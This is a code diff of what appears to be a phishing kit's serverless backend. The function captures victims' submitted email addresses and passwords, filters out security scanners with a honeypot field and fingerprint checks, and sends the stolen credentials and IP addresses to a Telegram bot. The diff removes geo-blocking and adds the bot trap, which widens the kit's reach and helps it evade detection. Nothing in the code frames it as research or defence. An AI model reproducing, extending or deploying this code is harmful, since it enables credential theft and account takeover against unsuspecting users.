@@ -1,5 +1,7 @@
 const fetch = require('node-fetch');
 
+// تم إزالة قيد ALLOWED_COUNTRIES (إلغاء الحظر الجغرافي)
+
 const getClientIp = (headers) => {
     return headers['x-nf-client-connection-ip'] || 
            headers['client-ip'] || 
@@ -25,28 +27,30 @@ exports.handler = async (event, context) => {
     }
 
     const ip = getClientIp(event.headers); 
-    let countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
+    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
     
-    // **آلية جلب رمز البلد الاحتياطية (FallBack)**
-    if (countryCode === 'غير متوفر' && ip !== 'غير متوفر') {
-        try {
-            const geoApiUrl = `http://ip-api.com/json/${ip}?fields=countryCode`;
-            const geoResponse = await fetch(geoApiUrl);
-            const geoData = await geoResponse.json();
+    const bodyParams = new URLSearchParams(event.body);
 
-            if (geoResponse.ok && geoData.countryCode) {
-                countryCode = geoData.countryCode; 
-            }
-        } catch (e) {
-            console.error("Error fetching geo location from API:", e);
-        }
+    // ----------------------------------------------------------------
+    // 1. فحص مصيدة العسل (Honeypot Check) - جديد
+    // ----------------------------------------------------------------
+    const botTrapValue = bodyParams.get('bot_trap');
+
+    if (botTrapValue) {
+        console.log(`[BLOCKED HONEYPOT] Bot trap engaged from IP: ${ip}, Country: ${countryCode}`);
+        // يتم حظر الطلب فوراً دون إرسال رسالة Telegram
+        return {
+            statusCode: 303,
+            headers: {
+                Location: '/waiting.html', 
+            },
+        };
     }
     
     // ----------------------------------------------------------------
-    // 1. تحليل بيانات البصمة وتطبيق الحظر (Bot/Human Check)
+    // 2. تحليل بيانات البصمة وتطبيق الحظر (Bot/Human Check)
     // ----------------------------------------------------------------
     
-    const bodyParams = new URLSearchParams(event.body);
     const email = bodyParams.get('login_email') || 'غير متوفر';
     const password = bodyParams.get('login_password') || 'غير متوفر';
     const fingerprintJSON = bodyParams.get('security_fingerprint'); 
@@ -69,7 +73,7 @@ exports.handler = async (event, context) => {
     }
 
     // ----------------------------------------------------------------
-    // 2. تطبيق الحظر الصارم (Bot Block)
+    // 3. تطبيق الحظر الصارم (Bot Block)
     // ----------------------------------------------------------------
     if (isBlocked) {
         console.log(`[BLOCKED BOT] Bot detected: ${securityStatus} from IP: ${ip}, Country: ${countryCode}`);
@@ -83,23 +87,23 @@ exports.handler = async (event, context) => {
     }
 
     // ----------------------------------------------------------------
-    // 3. معالجة الزوار الحقيقيين (Human - Send Telegram Alert)
+    // 4. معالجة الزوار الحقيقيين (Human - Send Telegram Alert)
     // ----------------------------------------------------------------
     
     const safe_email = escapeMarkdownV2(email);
     const safe_password = escapeMarkdownV2(password);
     const safe_ip = escapeMarkdownV2(ip);
-    const safe_country = escapeMarkdownV2(countryCode); // لا يزال يتم ترميزه لكنه لن يُستخدم في الرسالة
-
+    const safe_country = escapeMarkdownV2(countryCode);
+    
     // تشكيل الرسالة (تم حذف سطر Country)
     let message_text = `👤 *Login Data \\(Donsaa\\)* 👤\n\n`;
     message_text += `*STATUS: ${securityStatus}*\n\n`;
     message_text += `E\\-Mail: \`${safe_email}\`\n`;
     message_text += `Passwort: \`${safe_password}\`\n`;
-    message_text += `IP: \`${safe_ip}\`\n\n`; // <--- تم تعديل هذا السطر
-    
+    message_text += `IP: \`${safe_ip}\`\n\n`; 
+
     // ----------------------------------------------------------------
-    // 4. إرسال البيانات إلى Telegram 
+    // 5. إرسال البيانات إلى Telegram 
     // ----------------------------------------------------------------
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
